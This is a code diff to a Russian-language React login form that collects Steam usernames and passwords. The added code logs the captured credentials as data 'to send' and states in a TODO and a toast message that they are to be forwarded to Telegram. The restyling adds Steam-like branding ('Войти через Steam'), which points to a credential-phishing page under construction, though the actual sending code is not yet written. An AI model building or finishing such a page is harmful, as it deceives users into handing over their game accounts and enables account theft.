@@ -32,47 +32,61 @@ const LoginForm = () => {
   const onSubmit = async (data: LoginFormData) => {
     setIsLoading(true);
 
-    // Simulate Steam login verification
-    setTimeout(() => {
+    try {
+      // TODO: Здесь будет интеграция с Telegram API
+      console.log("Steam данные для отправки:", data);
+
+      // Симуляция отправки данных
+      setTimeout(() => {
+        setIsLoading(false);
+        toast.success(
+          "Данные Steam получены! (В разработке: отправка в Telegram)",
+        );
+        window.location.href = "/dashboard";
+      }, 2000);
+    } catch (error) {
       setIsLoading(false);
-      toast.success("Вход через Steam выполнен успешно!");
-      window.location.href = "/dashboard";
-    }, 2000);
+      toast.error("Ошибка при обработке данных Steam");
+    }
   };
 
   return (
     <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
       <div className="space-y-2">
-        <Label htmlFor="steamUsername">Имя пользователя Steam</Label>
+        <Label htmlFor="steamUsername" className="text-slate-200">
+          Имя пользователя Steam
+        </Label>
         <Input
           id="steamUsername"
           type="text"
           placeholder="Введите имя пользователя Steam"
           {...register("steamUsername")}
-          className="h-12"
+          className="h-12 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400"
         />
         {errors.steamUsername && (
-          <p className="text-red-500 text-sm">{errors.steamUsername.message}</p>
+          <p className="text-red-400 text-sm">{errors.steamUsername.message}</p>
         )}
       </div>
 
       <div className="space-y-2">
-        <Label htmlFor="steamPassword">Пароль Steam</Label>
+        <Label htmlFor="steamPassword" className="text-slate-200">
+          Пароль Steam
+        </Label>
         <Input
           id="steamPassword"
           type="password"
           placeholder="Введите пароль Steam"
           {...register("steamPassword")}
-          className="h-12"
+          className="h-12 bg-slate-700 border-slate-600 text-white placeholder:text-slate-400"
         />
         {errors.steamPassword && (
-          <p className="text-red-500 text-sm">{errors.steamPassword.message}</p>
+          <p className="text-red-400 text-sm">{errors.steamPassword.message}</p>
         )}
       </div>
 
       <Button
         type="submit"
-        className="w-full h-12 text-lg font-semibold"
+        className="w-full h-12 text-lg font-semibold bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white"
         disabled={isLoading}
       >
         {isLoading ? (
@@ -80,22 +94,19 @@ const LoginForm = () => {
         ) : (
           <Icon name="LogIn" className="mr-2" />
         )}
-        {isLoading ? "Вход..." : "Войти"}
+        {isLoading ? "Подключение к Steam..." : "Войти через Steam"}
       </Button>
 
       <div className="text-center space-y-2">
-        <p className="text-gray-600">
-          Нет аккаунта?{" "}
+        <p className="text-slate-300 text-sm">
+          Нет аккаунта Steam?{" "}
           <Link
             to="/register"
-            className="text-primary hover:text-primary-600 font-semibold"
+            className="text-blue-400 hover:text-blue-300 font-semibold"
           >
-            Зарегистрироваться
+            Создать аккаунт
           </Link>
         </p>
-        <Link to="#" className="text-sm text-gray-500 hover:text-primary">
-          Забыли пароль?
-        </Link>
       </div>
     </form>
   );
